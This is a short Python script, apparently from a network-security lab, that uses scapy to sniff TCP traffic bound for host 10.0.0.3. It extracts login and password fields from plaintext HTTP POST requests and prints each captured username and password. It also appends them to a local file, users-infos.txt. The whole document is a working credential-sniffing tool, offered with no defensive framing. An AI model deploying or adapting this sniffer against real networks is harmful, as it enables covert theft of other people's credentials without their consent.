from scapy.all import *
import re

#Callback method of sniff function
def alter_packet(pkt):
    if pkt.haslayer(IP) and pkt[IP].dst == '10.0.0.3':   
        if pkt.haslayer(Raw): 
            if str.encode('POST') in pkt[Raw].load:

                #Search for username and password in request
                login = re.search('Login=(.*)&Password', str(pkt[Raw].load)).group(1)
                password = re.search('Password=(.*)&', str(pkt[Raw].load)).group(1)
                print("Catched username : " + login + " password : " + password)

                #Write infos to save them
                f = open("users-infos.txt", "a")
                if str(login + ":" + password) not in open("users-infos.txt", "r").read():
                    f.write(login + ":" + password + "\n") 
    

#Sniff and filter packets
sniff(iface="eth0", filter="tcp", prn=alter_packet)